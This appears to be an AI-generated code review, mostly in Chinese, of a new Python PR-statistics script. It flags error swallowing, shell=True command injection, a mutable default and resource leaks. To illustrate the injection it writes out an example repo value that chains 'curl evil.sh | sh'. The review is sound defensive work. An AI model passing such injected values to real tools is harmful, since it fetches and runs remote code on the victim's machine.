<!-- deepseek-review -->
## 🤖 DeepSeek Code Review — 🛑 建議修改後再合併

這是一個新增的 PR 統計小工具（sandbox/pr_stats.py），會呼叫 GitHub API 抓取 PR 資料並輸出 CSV。整體有多個明確缺陷：`_fetch` 用裸 `except: pass` 吞掉所有錯誤並在失敗時回傳 `None`，導致下游 `pr["user"]` 直接 TypeError；`collect_authors` 使用可變預設參數 `seen=[]` 造成跨呼叫共用狀態；`archive` 以 `shell=True` 拼接外部輸入的 repo 與 path，具命令注入風險；`export_csv` 未使用 `with` 且未處理寫入例外。建議先修 `_fetch` 的錯誤處理與 `archive` 的注入問題，再處理可變預設值與資源管理。

### Findings（7 筆）

| | Severity | 位置 | 問題 | 信心 |
|---|---|---|---|---|
| 🛑 | Blocker | `sandbox/pr_stats.py:24` | _fetch 裸 except 吞掉所有錯誤並回傳 None | 0.95 |
| 🛑 | Blocker | `sandbox/pr_stats.py:77` | archive 以 shell=True 拼接外部輸入，可命令注入 | 0.90 |
| ⚠️ | Major | `sandbox/pr_stats.py:29` | collect_authors 使用可變預設參數 seen=[] | 0.90 |
| ⚠️ | Major | `sandbox/pr_stats.py:69` | export_csv 未使用 with，例外時檔案未關閉 | 0.85 |
| ⚠️ | Major | `sandbox/pr_stats.py:54` | threshold_from_env 對環境變數 int() 轉換未處理失敗 | 0.80 |
| 🔸 | Minor | `sandbox/pr_stats.py:40` | review_latency 假設 timeline 事件已排序且欄位存在 | 0.75 |
| 🔸 | Minor | `sandbox/pr_stats.py:81` | main 未驗證 sys.argv 長度即取用 | 0.70 |

<details><summary>🛑 <b>Blocker</b> — <code>sandbox/pr_stats.py:24</code> _fetch 裸 except 吞掉所有錯誤並回傳 None</summary>

`except:` 會連 `KeyboardInterrupt`、`SystemExit` 一起吃掉，且 `pass` 之後函式隱式回傳 `None`。任何網路錯誤、401/404（`HTTPError`）、JSON 解析失敗都會讓 `_fetch` 回傳 `None`，接著 `collect_authors` 的 `pr["user"]` 與 `main` 的 `pr["user"]` 會直接拋 `TypeError: 'NoneType' object is not subscriptable`，錯誤訊息完全指不到真正原因（token 失效、repo 不存在、rate limit）。建議改為 `except urllib.error.HTTPError as e:` / `except urllib.error.URLError as e:`，記錄 status 與 URL 後 `raise`（或用 `raise ... from e` 保留追蹤），至少不要用裸 `except`。

**判斷依據**：diff 第 20-23 行：`try:` 區塊內 `urlopen` 與 `json.loads` 都可能拋例外，`except:` 無型別且 body 只有 `pass`，函式無 return 陳述式。

</details>

<details><summary>🛑 <b>Blocker</b> — <code>sandbox/pr_stats.py:77</code> archive 以 shell=True 拼接外部輸入，可命令注入</summary>

`subprocess.run(f"tar czf {path}.tgz {path} && gh repo view {repo}", shell=True)` 把 `repo`（來自 `sys.argv[1]`）與 `path` 直接串進 shell 指令。攻擊者只要傳入如 `tznthou/x; curl evil.sh | sh` 的 repo 名稱，或讓 `path` 含 `;`、`$()`、反引號，就能在執行此腳本的機器上執行任意指令。此外 `subprocess.run` 未檢查 `returncode`，`tar` 或 `gh` 失敗時流程仍會印出成功訊息。建議改用參數陣列且不經 shell：`subprocess.run(["tar", "czf", f"{path}.tgz", path], check=True)`，並以 `check=True` 或檢查 `returncode` 處理失敗。

**判斷依據**：diff 第 96 行；`repo` 於 `main()` 由 `sys.argv[1]` 取得（第 100 行），`path` 由 `main` 的 f-string 產生（第 116 行），兩者皆未做任何跳脫即進入 shell 指令。

</details>

<details><summary>⚠️ <b>Major</b> — <code>sandbox/pr_stats.py:29</code> collect_authors 使用可變預設參數 seen=[]</summary>

`def collect_authors(repo, numbers, seen=[]):` 的預設 list 只在函式定義時建立一次，且函式內以 `seen.append(...)` 修改它。同一 process 內第二次呼叫（例如測試或未來重複呼叫）會沿用前一次累積的內容，回傳值不斷增長，`main` 印出的 `len(authors)` 也會失真。建議改為 `seen=None` 並在函式內 `if seen is None: seen = []`，或直接在函式內建立新 list。

**判斷依據**：diff 第 26 行定義可變預設值，第 29 行 `seen.append(pr["user"]["login"])` 對其進行修改。

</details>

<details><summary>⚠️ <b>Major</b> — <code>sandbox/pr_stats.py:69</code> export_csv 未使用 with，例外時檔案未關閉</summary>

`f = open(path, "w")` 之後若 `f.write` 因磁碟滿、權限或 `r['author']` 含非預期型別而拋例外，`f.close()` 永遠不會執行，檔案描述子會外洩；在長時間執行的 process 中反覆呼叫會累積。建議改用 `with open(path, "w", newline="") as f:`，並考慮用 `csv` 模組處理欄位中的逗號與換行（目前 f-string 直接拼接，author 名稱含逗號時會破壞 CSV 結構）。

**判斷依據**：diff 第 87 行開啟檔案，第 92 行才 `f.close()`，中間的 `f.write` 迴圈沒有 try/finally 或 with 保護。

</details>

<details><summary>⚠️ <b>Major</b> — <code>sandbox/pr_stats.py:54</code> threshold_from_env 對環境變數 int() 轉換未處理失敗</summary>

`int(raw)` 直接轉換外部輸入 `PR_STALE_DAYS`。若使用者設成 `PR_STALE_DAYS=7d` 或空字串以外的非數字（例如 `PR_STALE_DAYS=abc`），會拋 `ValueError` 使整個腳本崩潰，且錯誤訊息只說 invalid literal，看不出是哪個環境變數。建議 `try: return {"days": int(raw)} except ValueError: raise SystemExit(f"PR_STALE_DAYS 必須是整數，收到 {raw!r}")` 或提供預設值。

**判斷依據**：diff 第 51 行；`raw` 來自第 49 行 `os.environ.get("PR_STALE_DAYS", "")`，屬外部可控輸入。

</details>

<details><summary>🔸 <b>Minor</b> — <code>sandbox/pr_stats.py:40</code> review_latency 假設 timeline 事件已排序且欄位存在</summary>

`events[0]["created_at"]` 與 `events[-1]["created_at"]` 直接索引，未確認事件是否依時間排序，也未處理缺少 `created_at` 鍵的情況。GitHub timeline API 回傳順序不保證嚴格遞增，若最後一筆事件時間早於第一筆，`last - first` 會得到負的 latency；若某事件缺 `created_at` 則拋 `KeyError`。建議先過濾出含 `created_at` 的事件，再取 `min`/`max` 的時間戳相減。

**判斷依據**：diff 第 33-35 行；`events` 來自 `pr.get("timeline", [])`，僅檢查非空即直接索引首尾元素。

</details>

<details><summary>🔸 <b>Minor</b> — <code>sandbox/pr_stats.py:81</code> main 未驗證 sys.argv 長度即取用</summary>

`repo = sys.argv[1]` 在未提供任何參數時會拋 `IndexError: list index out of range`，使用者只會看到不明所以的 traceback。建議在 `main` 開頭檢查 `if len(sys.argv) < 2: raise SystemExit("用法: pr_stats.py <owner/repo> [PR 編號...]")`。

**判斷依據**：diff 第 103 行；`numbers = sys.argv[2:]` 可為空，但 `sys.argv[1]` 在無參數時不存在。

</details>

---

<sub>model `deepseek-flash` ｜ prompt tokens 3258 (cache hit 896) ｜ completion tokens 1987</sub>